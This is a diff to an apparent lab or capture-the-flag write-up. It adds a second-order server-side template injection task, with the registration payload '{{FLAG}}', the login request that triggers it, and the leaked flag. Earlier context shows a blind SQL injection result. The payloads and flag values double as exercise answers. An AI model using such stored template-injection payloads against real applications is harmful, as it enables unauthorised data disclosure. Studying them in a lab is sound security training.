@@ -36,3 +36,22 @@ The delay must be placed in the SELECT column list instead.
 [1, "b392a248a0a12c206fbef5098f8fd5bd", "Paid", "TIMOUT FLAG", "FLAG@web0x01.hbtn"]
 
 **Flag:** b392a248a0a12c206fbef5098f8fd5bd
+
+## Task 4 - Second-Order Blind Injection (SSTI via Jinja)
+
+**Technique:** The `name` field is stored during registration and later rendered 
+through a Jinja template during login (server-side template injection, not classic SQLi).
+The payload lies dormant until the second request triggers the template render.
+
+**Register payload:**
+POST /api/a3/sql_injection/second_order/register
+{"username": "ssti2", "name": "{{FLAG}}", "password": "password123"}
+
+**Trigger payload (login):**
+POST /api/a3/sql_injection/second_order/login
+{"username": "ssti2", "password": "password123"}
+
+**Result:**
+{"message":{"html":"<h1>Welcome Mr 8b815836739530ea8cc7929c29b63739</h1>", ...}}
+
+**Flag:** 8b815836739530ea8cc7929c29b63739
